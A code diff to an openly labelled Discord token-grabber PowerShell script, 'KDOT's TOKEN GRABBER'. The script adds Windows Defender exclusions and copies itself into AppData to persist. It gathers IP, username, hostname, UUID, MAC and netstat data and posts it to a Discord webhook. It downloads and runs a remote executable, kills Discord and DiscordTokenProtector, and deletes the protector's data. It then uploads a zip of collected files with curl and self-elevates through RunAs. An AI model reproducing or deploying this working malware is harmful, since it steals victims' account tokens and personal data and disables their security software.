@@ -8,7 +8,7 @@ function TASKS {
     if ($test_KDOT -eq $false) {
         Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
         Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
-        New-Item -ItemType Directory -Path "$env:LOCALAPPDATA\KDOT"
+        New-Item -ItemType Directory -Path "$env:APPDATA\KDOT"
         $origin = $MyInvocation.MyCommand.Path
         Copy-Item -Path "$origin" -Destination "$env:APPDATA\KDOT\KDOT.ps1"
     }
@@ -32,23 +32,71 @@ function Grub {
     $system_info = systeminfo.exe > $env:LOCALAPPDATA\Temp\system_info.txt
     $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
     $uuid > $env:LOCALAPPDATA\Temp\uuid.txt
-    $mac = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Select-Object -ExpandProperty MACAddress > $env:LOCALAPPDATA\Temp\mac.txt
+    $mac = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Select-Object -ExpandProperty MACAddress
+    $mac > $env:LOCALAPPDATA\Temp\mac.txt
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
     $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
 
-    $payload = @{
-        "username" = "KING KDOT"
+    $embed_and_body = @{
+        "username" = "KDOT"
+        "content" = "@everyone"
+        "title" = "KDOT"
+        "description" = "KDOT"
+        "color" = "16711680"
         "avatar_url" = "https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png"
-        "content" = "@everyone``````ip: $ip username: $username hostname: $hostname uuid: $uuid``````"
+        "url" = "https://discord.gg/vk3rBhcj2y"
+        "embeds" = @(
+            @{
+                "title" = "SOMALI GRABBER"
+                "url" = "https://discord.gg/vk3rBhcj2y"
+                "description" = "New person grabbed using KDOT's TOKEN GRABBER"
+                "color" = "16711680"
+                "footer" = @{
+                    "text" = "Made by KDOT and GODFATHER"
+                }
+                "thumbnail" = @{
+                    "url" = "https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png"
+                }
+                "fields" = @(
+                    @{
+                        "name" = "IP"
+                        "value" = "``````$ip``````"
+                    },
+                    @{
+                        "name" = "Username"
+                        "value" = "``````$username``````"
+                    },
+                    @{
+                        "name" = "Hostname"
+                        "value" = "``````$hostname``````"
+                    },
+                    @{
+                        "name" = "UUID"
+                        "value" = "``````$uuid``````"
+                    },
+                    @{
+                        "name" = "MAC"
+                        "value" = "``````$mac``````"
+                    }
+                )
+            }
+        )
     }
 
-    $payload = $payload | ConvertTo-Json
-    Invoke-WebRequest -Uri $webhook -Method Post -Body $payload -ContentType "application/json" | Out-Null
-    taskkill.exe /f /im "Discord.exe"
-    taskkill.exe /f /im "DiscordCanary.exe"
-    taskkill.exe /f /im "DiscordPTB.exe"
-    taskkill.exe /f /im "DiscordTokenProtector.exe"
+    $payload = $embed_and_body | ConvertTo-Json -Depth 10
+    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" | Out-Null
+
+    Set-Location $env:LOCALAPPDATA\Temp
+    Invoke-WebRequest -Uri "https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe" -OutFile "main.exe"
+
+    taskkill.exe /f /im "Discord.exe" | Out-Null
+    taskkill.exe /f /im "DiscordCanary.exe" | Out-Null
+    taskkill.exe /f /im "DiscordPTB.exe" | Out-Null
+    taskkill.exe /f /im "DiscordTokenProtector.exe" | Out-Null
+
+    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
+    $proc.WaitForExit()
 
     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
     if ($token_prot -eq $true) {
@@ -59,11 +107,6 @@ function Grub {
     if ($secure_dat -eq $true) {
         Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
     }
-
-    Set-Location $env:LOCALAPPDATA\Temp
-    Invoke-WebRequest -Uri "https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe" -OutFile "main.exe"
-    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
-    $proc.WaitForExit()
 
     $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT"
     if ($TEMP_KOT -eq $false) {
@@ -86,7 +129,7 @@ function Grub {
     Compress-Archive -Path "$lol\KDOT" -DestinationPath "$lol\KDOT.zip" -Force
     #Invoke-WebRequest -Uri "$webhook" -Method Post -InFile "$lol\KDOT.zip" -ContentType "multipart/form-data"
     #curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@$lol\KDOT.zip" $webhook
-    curl.exe -X POST -F 'payload_json={\"username\": \"KING KDOT\", \"content\": \"FILES BELOW\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png\"}' -F "file=@$lol\KDOT.zip" $webhook
+    curl.exe -X POST -F 'payload_json={\"username\": \"KING KDOT\", \"content\": \"\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png\"}' -F "file=@$lol\KDOT.zip" $webhook
     Remove-Item "$lol\KDOT.zip" -Force
     Remove-Item "$lol\KDOT" -Recurse -Force
     Remove-Item "$lol\main.exe" -Force
@@ -98,6 +141,6 @@ if (CHECK_IF_ADMIN -eq $true) {
     #pause
 } else {
     Write-Host ("Please run as admin!") -ForegroundColor Red
-    Start-Sleep -s 5
-    EXIT
+    $origin = $MyInvocation.MyCommand.Path
+    Start-Process powershell -ArgumentList "-noprofile -file $origin" -verb RunAs
 }
